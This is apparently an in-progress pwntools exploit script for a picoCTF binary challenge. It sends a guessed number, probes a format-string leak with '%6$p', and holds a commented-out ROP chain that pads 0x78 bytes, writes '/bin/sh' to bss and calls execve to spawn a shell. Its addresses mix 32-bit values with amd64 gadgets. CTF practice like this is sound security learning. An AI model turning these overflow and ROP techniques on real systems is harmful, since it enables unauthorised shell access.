from pwn import *
import random


if args.REMOTE:
    r = remote("jupiter.challenges.picoctf.org", 18263)
    ans = -3727
elif args.LOCAL:
    r = process("./vuln")
    ans = -2527


context.arch = "amd64"

'''#############
Read /bin/sh by libc read function
#############'''
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(ans).encode())
# success(r.recvuntil(b'Name? '))
r.recvuntil(b'Name? ')

# pop_rax_ret = 0x4163f4
# pop_rdi_ret = 0x400696
# pop_rdx_ret = 0x44a6b5
# pop_rsi_ret = 0x410ca3
main_fun_addr = 0x8049494
# libc_read_addr = 0x44a6a0
write_2_bss = 0X804c008
# syscall = 0x40137c

# ROP_payload = flat(
#     pop_rdi_ret, 0,
#     pop_rsi_ret, write_2_bss,
#     pop_rdx_ret, 9,
#     libc_read_addr,
#     main_fun_addr
# )
# r.sendline(b'a' * 0x78 + ROP_payload)
# r.sendline(b'/bin/sh\x00')

'''#############
Execute shell
#############'''
raw_input()
r.sendline(b"%6$p")
# r.recvuntil(b'What number would you like to guess?\n')
# r.sendline(str(ans).encode())
# print(r.recvuntil(b'Name? '))

# ROP_payload = flat(
#     pop_rax_ret, 0x3b,
#     pop_rdi_ret, write_2_bss,
#     pop_rsi_ret, 0,
#     pop_rdx_ret, 0,
#     syscall
# )
# # raw_input()
# r.sendline(b'a' * 0x78 + ROP_payload)
r.interactive()
